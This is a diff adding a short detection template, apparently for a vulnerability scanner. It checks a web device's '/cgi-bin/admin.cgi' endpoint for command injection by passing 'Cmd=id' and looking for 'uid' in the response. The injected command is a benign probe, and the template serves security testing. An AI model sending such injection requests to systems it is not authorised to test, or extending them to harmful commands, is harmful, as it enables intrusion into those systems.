@@ -1,0 +1,21 @@
+id: Command-injection
+
+info:
+  name: Command injection Detection
+  author: ibrahimhaxor
+  severity: high
+
+requests:
+  - method: GET
+
+    path:
+      - "{{BaseURL}}/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - uid
+        part: body
+      - type: status
+        status:
+          - 200
